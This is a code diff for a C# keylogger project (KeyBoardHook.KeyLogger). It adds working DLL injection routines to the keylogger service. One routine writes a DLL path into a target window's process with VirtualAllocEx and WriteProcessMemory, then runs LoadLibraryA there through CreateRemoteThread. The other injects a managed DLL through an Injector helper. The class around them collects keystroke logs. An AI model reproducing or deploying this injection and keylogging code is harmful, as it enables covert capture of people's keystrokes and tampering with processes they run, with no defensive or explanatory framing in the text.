@@ -2,13 +2,17 @@
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
+using System.Text;
 using System.Windows.Forms;
+using FastWin32.Diagnostics;
 using KeyBoardHook.Common.Native;
 using KeyBoardHook.ExternalWindow;
 using KeyBoardHook.KeyLogger.Entity;
 using KeyBoardHook.KeyLogger.Enums;
 using KeyBoardHook.KeyLogger.Hooker;
 using Keys = System.Windows.Forms.Keys;
+using System.Runtime.InteropServices;
+
 
 namespace KeyBoardHook.KeyLogger.Service
 {
@@ -79,8 +83,7 @@ namespace KeyBoardHook.KeyLogger.Service
 
         public void Start(string type,string className ,string title)
         {
-            
-            
+
             IntPtr threadId = IntPtr.Zero;
 
             IntPtr moduleHandle;
@@ -100,17 +103,9 @@ namespace KeyBoardHook.KeyLogger.Service
                     _activeWindowHook.Hook(threadId);
                     break;
                 case "指定窗口进程钩子":
-                    var hWnd = NativeMethods.FindWindow(
-                        className.Equals("")?null:className, title.Equals("")?null:title);
-                    NativeMethods.GetWindowThreadProcessId(hWnd, out threadId);
-                    MessageBox.Show("hWnd:" + hWnd + " threadId:" + threadId);
-                    if (threadId.Equals(IntPtr.Zero))
-                    {
-                        throw new Exception("threadId.Equals(IntPtr.Zero)");
-                    }
-                    moduleHandle = NativeMethods.GetModuleHandle(Process.GetProcessById(threadId.ToInt32()).MainModule.ModuleName);
-                    MessageBox.Show("moduleHandle:"  + moduleHandle);
-                    mouseHookService.Hook(HookType.WH_MOUSE_LL,moduleHandle, threadId);
+
+                    // injectionCCharpDLL(className.Equals("") ? null : className, title.Equals("") ? null : title);
+                    injectionCDLL(className.Equals("") ? null : className, title.Equals("") ? null : title);
                     break;
               
             }
@@ -118,6 +113,77 @@ namespace KeyBoardHook.KeyLogger.Service
           
         }
 
+        public void injectionCCharpDLL(string className, string title)
+        {
+            
+            string sDllPath;
+            sDllPath = "C:\\Users\\voidm\\Desktop\\Release\\MyLib.dll";
+            var hWnd = NativeMethods.FindWindow(className,title);
+            IntPtr threadId;
+            var windowThreadProcessId = NativeMethods.GetWindowThreadProcessId(hWnd, out threadId);
+            // MessageBox.Show("windowThreadProcessId" + windowThreadProcessId + " threadId " + threadId  + " (uint) threadId" + (uint) threadId);
+            int num;
+            string args = "args";
+            MessageBox.Show(Injector.InjectManaged((uint) threadId, sDllPath, "MyLib.MyLib", "demo", args, out num)
+                .ToString());
+            
+            
+            
+
+        }
+
+        public void injectionCDLL(string className, string title)
+        {
+            string sDllPath;
+            sDllPath = "C:\\Users\\voidm\\Desktop\\Release\\MyLib.dll";
+
+            var hWnd = NativeMethods.FindWindow(className,title);
+            IntPtr threadId;
+            NativeMethods.GetWindowThreadProcessId(hWnd, out threadId);
+
+            MessageBox.Show("threadId: " + threadId);
+            {
+                IntPtr hndProc = NativeMethods.OpenProcess((0x2 | 0x8 | 0x10 | 0x20 | 0x400), true, threadId);
+                if (hndProc == IntPtr.Zero)
+                {
+                    MessageBox.Show("OpenProcess 异常");
+                    return;
+                }
+                    
+                IntPtr lpLLAddress = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
+                if (lpLLAddress == IntPtr.Zero)
+                {
+                    MessageBox.Show("GetProcAddress 异常");
+                    return;
+                }
+                    
+                IntPtr lpAddress = NativeMethods.VirtualAllocEx(hndProc, (IntPtr)null, (IntPtr)sDllPath.Length, (0x1000 | 0x2000), 0X40);
+
+                if (lpAddress == IntPtr.Zero)
+                {
+                    MessageBox.Show("VirtualAllocEx 异常");
+                    return;
+                }
+                byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);
+
+                var writeProcessMemory = NativeMethods.WriteProcessMemory(hndProc, lpAddress, bytes, (uint)bytes.Length, 0);
+                if (writeProcessMemory == 0)
+                {
+                    MessageBox.Show("WriteProcessMemory 异常");
+                    return;                    
+                }
+
+                var remoteThread = NativeMethods.CreateRemoteThread(hndProc, (IntPtr)null, (IntPtr)0, lpLLAddress, lpAddress, 0, (IntPtr)null); 
+                if (remoteThread==(IntPtr)0)
+                {
+                    MessageBox.Show("CreateRemoteThread 异常");
+                    return;       
+                }
+                MessageBox.Show("CloseHandle");
+                NativeMethods.CloseHandle(hndProc);
+            }
+            
+        }
         public bool TryPushKeyLog()
         {
             if (_logFile.Exists && _logFile.Length > 0)
